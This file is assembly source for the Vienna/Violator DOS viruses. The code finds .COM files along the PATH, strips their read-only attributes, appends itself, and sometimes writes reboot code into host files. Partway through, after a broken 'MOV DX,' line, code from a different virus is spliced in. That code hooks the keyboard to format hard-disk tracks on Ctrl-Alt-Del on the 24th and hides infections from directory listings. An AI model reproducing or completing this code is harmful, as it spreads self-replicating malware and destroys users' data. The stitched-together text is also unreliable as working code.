

;
;		      Vienna and Violator Viruses
;

MOV_CX  MACRO   X
        DB      0B9H
        DW      X
ENDM


CODE    SEGMENT
        ASSUME DS:CODE,SS:CODE,CS:CODE,ES:CODE
        ORG     $+0100H

;*****************************************************************************
;Start out with a JMP around the remains of the original .COM file, into the
;virus. The actual .COM file was just an INT 20, followed by a bunch of NOPS.
;The rest of the file (first 3 bytes) are stored in the virus data area.
;*****************************************************************************

VCODE:  JMP     virus


;This was the rest  of the original .COM file. Tiny and simple, this time

        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP


;************************************************************
;              The actual virus starts here
;************************************************************

v_start equ     $


virus:  PUSH    CX
        MOV     DX,OFFSET vir_dat       ;This is where the virus data starts.
                                        ; The 2nd and 3rd bytes get modified.
        CLD                             ;Pointers will be auto INcremented
        MOV     SI,DX                   ;Access data as offset from SI
        ADD     SI,first_3              ;Point to original 1st 3 bytes of .COM
        MOV     DI,OFFSET 100H          ;`cause all .COM files start at 100H
        MOV     CX,3
        REPZ    MOVSB                   ;Restore original first 3 bytes of .COM
        MOV     SI,DX                   ;Keep SI pointing to the data area

;*************************************************************
;                   Check the DOS version
;*************************************************************

        MOV     AH,30H
        INT     21H

        CMP     AL,0                    ;0 means it's version 1.X

        JNZ     dos_ok                  ;For version 2.0 or greater
        JMP     quit                    ;Don't try to infect version 1.X


;*************************************************************
;  Here if the DOS version is high enough for this to work
;*************************************************************

dos_ok: PUSH    ES


;*************************************************************
;               Get DTA address into ES:BX
;*************************************************************

        MOV     AH,2FH
        INT     21H

;*************************************************************
;                    Save the DTA address
;*************************************************************


        MOV     [SI+old_dta],BX
        MOV     [SI+old_dts],ES         ;Save the DTA address

        POP     ES

;*************************************************************
;        Set DTA to point inside the virus data area
;*************************************************************

        MOV     DX,dta                  ;Offset of new DTA in virus data area
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI                   ;Compute DTA address
        MOV     AH,1AH
        INT     21H                     ;Set new DTA to inside our own code


        PUSH    ES
        PUSH    SI
        MOV     ES,DS:2CH
        MOV     DI,0                    ;ES:DI points to environment

;************************************************************
;        Find the "PATH=" string in the environment
;************************************************************

find_path:
        POP     SI
        PUSH    SI                      ;Get SI back
        ADD     SI,env_str              ;Point to "PATH=" string in data area
        LODSB
        MOV     CX,OFFSET 8000H         ;Environment can be 32768 bytes long
        REPNZ   SCASB                   ;Search for first character
        MOV     CX,4

;************************************************************
;       Loop to check for the next four characters
;************************************************************

check_next_4:
        LODSB
        SCASB
        JNZ     find_path               ;If not all there, abort & start over
        LOOP    check_next_4            ;Loop to check the next character

        POP     SI
        POP     ES
        MOV     [SI+path_ad],DI         ;Save the address of the PATH
        MOV     DI,SI
        ADD     DI,wrk_spc              ;File name workspace
        MOV     BX,SI                   ;Save a copy of SI
        ADD     SI,wrk_spc              ;Point SI to workspace
        MOV     DI,SI                   ;Point DI to workspace
        JMP     SHORT   slash_ok


;**********************************************************
;     Look in the PATH for more subdirectories, if any
;**********************************************************

set_subdir:
        CMP     WORD PTR [SI+path_ad],0 ;Is PATH string ended?
        JNZ     found_subdir            ;If not, there are more subdirectories
        JMP     all_done                ;Else, we're all done


;**********************************************************
;    Here if there are more subdirectories in the path
;**********************************************************

found_subdir:
        PUSH    DS
        PUSH    SI
        MOV     DS,ES:2CH               ;DS points to environment segment
        MOV     DI,SI
        MOV     SI,ES:[DI+path_ad]      ;SI = PATH address
        ADD     DI,wrk_spc              ;DI points to file name workspace


;***********************************************************
;      Move subdirectory name into file name workspace
;***********************************************************

move_subdir:
        LODSB                           ;Get character
        CMP     AL,';'                  ;Is it a ';' delimiter?
        JZ      moved_one               ;Yes, found another subdirectory
        CMP     AL,0                    ;End of PATH string?
        JZ      moved_last_one          ;Yes
        STOSB                           ;Save PATH marker into [DI]
        JMP     SHORT   move_subdir

;******************************************************************
; Mark the fact that we're looking through the final subdirectory
;******************************************************************

moved_last_one:
        MOV     SI,0


;******************************************************************
;              Here after we've moved a subdirectory
;******************************************************************

moved_one:
        POP     BX                      ;Pointer to virus data area
        POP     DS                      ;Restore DS
        MOV     [BX+path_ad],SI         ;Address of next subdirectory
        NOP

;******************************************************************
;             Make sure subdirectory ends in a "\"
;******************************************************************

        CMP     CH,'\'                  ;Ends with "\"?
        JZ      slash_ok                ;If yes
        MOV     AL,'\'                  ;Add one, if not
        STOSB


;******************************************************************
;     Here after we know there's a backslash at end of subdir
;******************************************************************

slash_ok:
        MOV     [BX+nam_ptr],DI         ;Set filename pointer to name workspace
        MOV     SI,BX                   ;Restore SI
        ADD     SI,f_spec               ;Point to "*.COM"
        MOV     CX,6
        REPZ    MOVSB                   ;Move "*.COM",0 to workspace

        MOV     SI,BX


;*******************************************************************
;                 Find first string matching *.COM
;*******************************************************************

        MOV     AH,4EH
        MOV     DX,                                             
                cmp     word ptr cs:[buffer][bp],5A4Dh                     
                je      exit_exe_file          ;Its an EXE file...         
                mov     bx,offset buffer       ;Its a COM file restore     
                add     bx,bp                  ;First three Bytes...       
                mov     ax,[bx]                ;Mov the Byte to AX         
                mov     word ptr ds:[100h],ax  ;First two bytes Restored   
                add     bx,2                   ;Get the next Byte          
                mov     al,[bx]                ;Move the Byte to AL        
                mov     byte ptr ds:[102h],al  ;Restore the Last of 3 Bytes
                pop     ds                                                 
                pop     es                                                 
                pop     bp                     ;Restore Regesters          
                pop     di                                                 
                pop     si                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                mov     ax,100h                ;Jump Back to Beginning     
                push    ax                     ;Restores our IP (a CALL    
                retn                           ;Saves them, now we changed 
int21           dd      ?                      ;Our Old Int21              
int9            dd      ?                      ;Our Old Int9               
                                                                           
exit_exe_file:                                                             
                mov     bx,word ptr cs:[buffer+22][bp]  ;Load CS Regester  
                mov     dx,cs                                              
                sub     dx,bx                                              
                mov     ax,dx                                              
                add     ax,word ptr cs:[exe_cs][bp]        ;Get original CS
                add     dx,word ptr cs:[exe_ss][bp]        ;Get original SS
                mov     bx,word ptr cs:[exe_ip][bp]        ;Get original IP
                mov     word ptr cs:[fuck_yeah][bp],bx     ;Restore IP     
                mov     word ptr cs:[fuck_yeah+2][bp],ax   ;Restore CS     
                mov     ax,word ptr cs:[exe_sp][bp]        ;Get original SP
                mov     word ptr cs:[Rock_Fix1][bp],dx     ;Restore SS     
                mov     word ptr cs:[Rock_Fix2][bp],ax     ;Restore SP     
                pop     ds                                                 
                pop     es                                                 
                pop     bp                                                 
                pop     di                                                 
                pop     si                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                db      0B8h                   ;This is now a MOV AX,XXXX  
Rock_Fix1:                                     ;XXXX is the original SS    
                dw      0                      ;Our XXXX Value             
                cli                            ;Disable Interrupts         
                mov     ss,ax                  ;Mov it to SS               
                db      0BCh                   ;This is now a MOV SP,XXXX  
Rock_Fix2:                                                                 
                dw      0                      ;The XXXX Value for SP      
                sti                            ;Enable interrupts          
                db      0EAh                   ;JMP XXXX:YYYY              
fuck_yeah:                                                                 
                dd      0                      ;Dword IP:CS (Reverse order!
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                       Int 9 Handler                                      
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
int9_handler:                                  ;Every TIME a KEY is pressed
                push    ax                     ;This ROUTINE is called!    
                in      al,60h                 ;Has the user attempted a   
                cmp     al,del_code            ;CTRL-ALT-DEL               
                je      warm_reboot            ;Yes! Screw him             
bye_bye:        pop     ax                                                 
                jmp     dword ptr cs:[int9]    ;Nope, Leave system alone   
warm_reboot:                                                               
                mov     ah,2ah                 ;Get Date Please            
                int     21h                                                
                cmp     dl,18h                 ;Is it 24th of the Month?   
                jne     bye_bye                ;Yes, bye_Bye HD            
                mov     ch,0                                               
hurt_me:        mov     ah,05h                                             
                mov     dh,0                                               
                mov     dl,80h                 ;Formats a few tracks...    
                int     13h                    ;Hurts So good...           
                inc     ch                                                 
                cmp     ch,20h                                             
                loopne  hurt_me                                            
                db      0eah,0f0h,0ffh,0ffh,0ffh  ;Reboot!                 
                iret                                                       
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                       Dir Handler                                        
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
dir_handler:                                                               
                pushf                                                      
                push    cs                                                 
                call    int21call              ;Get file Stats             
                test    al,al                  ;Good FCB?                  
                jnz     no_good                ;nope                       
                push    ax                                                 
                push    bx                                                 
                push    es                                                 
                mov     ah,51h                 ;Is this Undocmented? huh...
                int     21h                                                
                                                                           
                mov     es,bx                                              
                cmp     bx,es:[16h]                                        
                jnz     not_infected           ;Not for us man...          
                mov     bx,dx                                              
                mov     al,[bx]                                            
                push    ax                                                 
                mov     ah,2fh                 ;Get file DTA               
                int     21h                                 wrk_spc
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI                   ;DX points to "*.COM" in workspace
        MOV     CX,3                    ;Attributes of Read Only or Hidden OK
        INT     21H

        JMP     SHORT   find_first


;*******************************************************************
;              Find next ASCIIZ string matching *.COM
;*******************************************************************

find_next:
        MOV     AH,4FH
        INT     21H

find_first:
        JNB     found_file              ;Jump if we found it
        JMP     SHORT   set_subdir      ;Otherwise, get another subdirectory

;*******************************************************************
;                      Here when we find a file
;*******************************************************************

found_file:
        MOV     AX,[SI+dta_tim]         ;Get time from DTA
        AND     AL,1FH                  ;Mask to remove all but seconds
        CMP     AL,1FH                  ;62 seconds -> already infected
        JZ      find_next               ;If so, go find another file

        CMP     WORD PTR [SI+dta_len],OFFSET 0FA00H ;Is the file too long?
        JA      find_next               ;If too long, find another one

        CMP     WORD PTR [SI+dta_len],0AH ;Is it too short?
        JB      find_next               ;Then go find another one

        MOV     DI,[SI+nam_ptr]         ;DI points to file name
        PUSH    SI                      ;Save SI
        ADD     SI,dta_nam              ;Point SI to file name

;********************************************************************
;                Move the name to the end of the path
;********************************************************************

more_chars:
        LODSB
        STOSB
        CMP     AL,0
        JNZ     more_chars              ;Move characters until we find a 00


;********************************************************************
;                        Get File Attributes
;********************************************************************

        POP     SI
        MOV     AX,OFFSET 4300H
        MOV     DX,wrk_spc              ;Point to \path\name in workspace
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI
        INT     21H


        MOV     [SI+old_att],CX         ;Save the old attributes


;********************************************************************
;         Rewrite the attributes to allow writing to the file
;********************************************************************

        MOV     AX,OFFSET 4301H         ;Set attributes
        AND     CX,OFFSET 0FFFEH        ;Set all except "read only" (weird)
        MOV     DX,wrk_spc              ;Offset of \path\name in workspace
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI                   ;Point to \path\name
        INT     21H

;********************************************************************
;                Open Read/Write channel to the file
;********************************************************************

        MOV     AX,OFFSET 3D02H         ;Read/Write
        MOV     DX,wrk_spc              ;Offset to \path\name in workspace
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI                   ;Point to \path\name
        INT     21H

        JNB     opened_ok               ;If file was opened OK
        JMP     fix_attr                ;If it failed, restore the attributes


;*******************************************************************
;                        Get the file date & time
;*******************************************************************

opened_ok:
        MOV     BX,AX
        MOV     AX,OFFSET 5700H
        INT     21H

        MOV     [SI+old_tim],CX         ;Save file time
        MOV     [SI+ol_date],DX         ;Save the date

;*******************************************************************
;                        Get current system time
;*******************************************************************

        MOV     AH,2CH
        INT     21H


        AND     DH,7                    ;Last 3 bits 0? (once in eight)
        JNZ     seven_in_eight


;*******************************************************************
; The special "one in eight" infection. If the above line were in
;  its original form, this code would be run 1/8 of the time, and
;  rather than appending a copy of this virus to the .COM file, the
;  file would get 5 bytes of code that reboot the system when the
;  .COM file is run.
;*******************************************************************


        MOV     AH,40H                  ;Write to file
        MOV     CX,5                    ;Five bytes
        MOV     DX,SI
        ADD     DX,reboot               ;Offset of reboot code in data area
        INT     21H

        JMP     SHORT   fix_time_stamp

        NOP


;******************************************************************
;      Here's where we infect a .COM file with this virus
;******************************************************************

seven_in_eight:
        MOV     AH,3FH
        MOV     CX,3
        MOV     DX,first_3
;       NOP                     ;MASM will add this NOP here
        ADD     DX,SI
        INT     21H             ;Save first 3 bytes into the data area

        JB      fix_time_stamp  ;Quit, if read failed

        CMP     AX,3            ;Were we able to read all 3 bytes?
        JNZ     fix_time_stamp  ;Quit, if not


;******************************************************************
;              Move file pointer to end of file
;******************************************************************

        MOV     AX,OFFSET 4202H
        MOV     CX,0
        MOV     DX,0
        INT     21H

        JB      fix_time_stamp  ;Quit, if it didn't work

        MOV     CX,AX           ;DX:AX (long int) = file size
        SUB     AX,3            ;Subtract 3 (OK, since DX must be 0, here)
        MOV     [SI+jmp_dsp],AX ;Save the displacement in a JMP instruction

        ADD     CX,OFFSET c_len_y
        MOV     DI,SI           ;Point DI to virus data area
        SUB     DI,OFFSET c_len_x
                                ;Point DI to reference vir_dat, at start of pgm
        MOV     [DI],CX         ;Modify vir_dat reference:2nd, 3rd bytes of pgm


;*******************************************************************
;                    Write virus code to file
;*******************************************************************

        MOV     AH,40H

        MOV_CX  virlen                  ;Length of virus, in bytes

        MOV     DX,SI
        SUB     DX,OFFSET codelen       ;Length of virus code, gives starting
                                        ; address of virus code in memory
        INT     21H

        JB      fix_time_stamp     
